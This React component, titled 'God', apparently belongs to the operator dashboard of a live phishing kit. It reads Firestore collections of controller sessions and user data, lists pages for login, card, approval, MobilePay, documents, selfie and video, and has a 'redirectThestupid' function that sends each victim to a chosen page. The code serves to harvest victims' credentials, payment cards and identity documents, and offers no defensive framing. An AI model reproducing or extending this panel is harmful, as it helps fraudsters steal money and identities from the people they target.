import {
  collection,
  doc,
  getDocs,
  onSnapshot,
  orderBy,
  query,
  setDoc,
  updateDoc,
  where,
} from "firebase/firestore";
import React, { useEffect, useState } from "react";
import { db } from "../../firebase";
import AdminCard from "../../components/AdminCard";

function God() {
  const [controller, setControllers] = useState();
  const [data, setData] = useState([]);
  const [pages, setPages] = useState(["login", "card", "approve", "mobilepay","docs","selfie","video"]);

  const getUsersControllers = async () => {
    const ids = [];
    const unsub = onSnapshot(collection(db, "admin"), (cl) => {
      const usersData = cl.docs.map((doc) => {
        ids.push(doc.id.replace("+", ""));
        return {
          id: doc.id,
          ...doc.data(),
        };
      });
      setControllers(usersData);
      getUserData(ids);
    });
  };

  // const toggleTab = (isControl, tab) => {
  //   setIsController(isControl);
  //   setSelectedELm(tab);
  // };

  const getPassedUserData = (id) => {
    return data
      ?.filter((elm) => elm[0]?.id == id.replaceAll("+", ""))
      .flat()
      .map((e) => {
        const { id, ...rest } = e;
        return rest;
      });
  };

  const getUserData = async (ids) => {
    const q = query(collection(db, "Users"), where("id", "in", ids));
    const datas = {};
    const querySnapshot = await getDocs(q);
    querySnapshot.forEach((doc) => {
      datas[doc.data().id] = [...(datas[doc.data().id] || []), doc.data()];
    });
    setData(Object.values(datas));
  };

  const redirectThestupid = async (identifier, params) => {
    await updateDoc(doc(db, "admin", identifier), {
      loading: false,
      ...params,
    });
  };

  useEffect(() => {
    getUsersControllers();
  }, []);
  [];

  return (
    <>
      {controller &&
        controller.map((ctr, index) => (
          <AdminCard
            key={index}
            ctr={ctr}
            getPassedUserData={getPassedUserData}
            redirectThestupid={redirectThestupid}
            pages={pages}
          />
        ))}
    </>
  );
}

export default God;
